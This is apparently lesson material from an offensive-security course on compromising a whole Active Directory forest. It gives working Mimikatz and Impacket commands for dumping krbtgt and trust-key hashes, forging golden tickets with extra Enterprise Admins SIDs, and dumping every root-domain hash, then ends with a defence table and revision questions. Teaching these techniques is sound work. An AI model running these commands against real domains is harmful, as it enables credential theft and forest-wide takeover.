# Forest Compromise

## Unit 8 - Topic 3 | Domain Dominance

---

## Overview

**Forest compromise** extends domain dominance to the entire Active Directory forest, gaining Enterprise Admin privileges and access to all domains within the forest. The most common path is from child domain DA to forest root EA via trust exploitation and SID History attacks.

---

## 1. Forest Structure and Attack Surface

```
FOREST HIERARCHY:

corp.local (Forest Root Domain)
├── Enterprise Admins (control entire forest)
├── Schema Admins (modify AD schema)
│
├── dev.corp.local (Child Domain)
│   ├── Domain Admins (control dev only)
│   └── Parent-Child trust (automatic, transitive)
│
├── staging.corp.local (Child Domain)
│   └── Parent-Child trust (automatic, transitive)
│
└── partner.com (External Forest)
    └── Forest trust (manual, may be transitive)

ATTACK PATHS TO FOREST COMPROMISE:
├── Child DA → SID History → Enterprise Admin (most common)
├── Child DA → krbtgt hash → Extra SID Golden Ticket
├── Trust exploitation → Cross-domain access
├── AD CS → Certificate for root domain admin
└── Shared admin accounts across domains
```

---

## 2. Child Domain to Forest Root

```bash
# === EXTRA SID / SID HISTORY ATTACK ===
# Most common forest escalation technique

# REQUIREMENTS:
# - DA access in child domain (dev.corp.local)
# - krbtgt hash of child domain
# - SID of Enterprise Admins group in root domain

# === STEP 1: Get child domain krbtgt hash ===
# From child domain DC:
lsadump::dcsync /user:dev\krbtgt /domain:dev.corp.local
# Or:
secretsdump.py dev.corp.local/da:pass@dev-dc01 \
  -just-dc-user krbtgt

# Save: krbtgt NTLM hash

# === STEP 2: Get Enterprise Admins SID ===
# Enterprise Admins is in root domain (corp.local)
Get-DomainGroup -Identity "Enterprise Admins" -Domain corp.local
# SID: S-1-5-21-ROOT-DOMAIN-SID-519

# Or:
Get-DomainSID -Domain corp.local
# S-1-5-21-ROOT-DOMAIN-SID
# Append -519 for Enterprise Admins

# === STEP 3: Forge Golden Ticket with Extra SID ===
# Mimikatz:
kerberos::golden /user:Administrator \
  /domain:dev.corp.local \
  /sid:S-1-5-21-CHILD-DOMAIN-SID \
  /krbtgt:CHILD_KRBTGT_HASH \
  /sids:S-1-5-21-ROOT-DOMAIN-SID-519 \
  /ptt
# /sids: Extra SIDs to include (Enterprise Admins!)

# Impacket:
ticketer.py -nthash CHILD_KRBTGT_HASH \
  -domain-sid S-1-5-21-CHILD-SID \
  -domain dev.corp.local \
  -extra-sid S-1-5-21-ROOT-SID-519 \
  Administrator
export KRB5CCNAME=Administrator.ccache

# === STEP 4: Access Root Domain ===
# Access root domain DC:
psexec.py dev.corp.local/Administrator@root-dc01 -k -no-pass
# Or:
dir \\root-dc01.corp.local\c$

# DCSync root domain:
secretsdump.py dev.corp.local/Administrator@root-dc01 \
  -k -no-pass -just-dc
# Now have ALL hashes from root domain!
```

---

## 3. Trust Key Attacks

```bash
# === INTER-REALM TRUST KEY ===
# Each trust has a shared secret (trust key)
# Can be used instead of krbtgt for cross-domain tickets

# Extract trust key:
# Mimikatz (on child DC):
lsadump::trust /patch
# Shows: trust key between dev.corp.local and corp.local

# Or via DCSync:
lsadump::dcsync /user:dev\corp$ /domain:dev.corp.local
# The trust account (corp$) hash IS the trust key

# === FORGE INTER-REALM TGT ===
# Using trust key instead of krbtgt:
kerberos::golden /user:Administrator \
  /domain:dev.corp.local \
  /sid:S-1-5-21-CHILD-SID \
  /rc4:TRUST_KEY_HASH \
  /service:krbtgt \
  /target:corp.local \
  /sids:S-1-5-21-ROOT-SID-519 \
  /ticket:inter-realm.kirbi

# This is a referral ticket for the root domain
# KDC will exchange it for a TGT in root domain
kerberos::ptt inter-realm.kirbi
dir \\root-dc01.corp.local\c$
```

---

## 4. Cross-Forest Attacks

```bash
# === FOREST TRUSTS (More Limited) ===
# External and forest trusts have SID filtering by default
# SID filtering blocks the Extra SID attack!

# === CHECK SID FILTERING ===
netdom trust corp.local /d:partner.com /quarantine
# If quarantine is ON → SID filtering enabled → blocked

# === IF SID FILTERING IS DISABLED ===
# (Misconfiguration — rare but happens)
# Same Extra SID attack works across forests!

# === ALTERNATIVES WHEN SID FILTERING IS ON ===

# 1. Exploit shared accounts:
# Same admin account in both forests?
# Same password? → Direct access

# 2. Foreign group membership:
Get-DomainForeignGroupMember -Domain partner.com
# Users from corp.local in partner.com groups
# If we own these users → access partner.com resources

# 3. Trust abuse via constrained delegation:
# If a service account has constrained delegation
# to a service in the other forest

# 4. AD CS:
# If both forests share a CA or have trust for certificates
# Request certificate for user in other forest

# 5. MSSQL links:
# Database links between forests
# Can be chained for command execution
```

---

## 5. Defense Against Forest Compromise

| Defense | Implementation |
|---------|---------------|
| **SID filtering** | Ensure enabled on all external/forest trusts |
| **Selective authentication** | Limit which resources trusted users access |
| **Separate admin accounts** | Different admin per domain/forest |
| **Monitor trust changes** | Alert on new trusts or trust modifications |
| **Minimize trusts** | Remove unnecessary trust relationships |
| **Audit EA group** | Monitor Enterprise Admins membership |
| **krbtgt rotation** | Regular rotation in all domains |
| **Segregate forests** | Use separate forests for high-security resources |

```
DEFENSE IN DEPTH:
├── LEVEL 1: Prevent child domain compromise
│   └── Strong security in all domains
├── LEVEL 2: Limit cross-domain escalation
│   ├── SID filtering on all trusts
│   ├── Selective authentication
│   └── Separate admin accounts
├── LEVEL 3: Detect trust abuse
│   ├── Monitor for inter-realm TGT requests
│   ├── Alert on EA group changes
│   └── Track cross-domain authentication
└── LEVEL 4: Contain forest compromise
    ├── Separate forests for critical systems
    └── Air-gapped admin environments
```

---

## Summary Table

| Attack | Source | Target | Requirement |
|--------|--------|--------|-------------|
| **Extra SID** | Child DA | Forest EA | Child krbtgt hash |
| **Trust key** | Child DA | Forest root | Trust key hash |
| **SID History** | Any domain | Cross-domain | SID filtering off |
| **Foreign members** | Trusted domain | Local resources | User compromise |
| **Shared accounts** | Any forest | Other forest | Same credentials |

---

## Quick Revision Questions

1. **How does a child domain DA become Enterprise Admin?**
2. **What is the Extra SID attack in Golden Tickets?**
3. **How does SID filtering prevent forest-level attacks?**
4. **What is a trust key and how can it be abused?**
5. **Why are separate admin accounts important across domains?**

---

[← Previous: Domain Controller Compromise](02-domain-controller-compromise.md) | [Next: Trust Exploitation →](04-trust-exploitation.md)

---

*Unit 8 - Topic 3 of 5 | [Back to README](../README.md)*
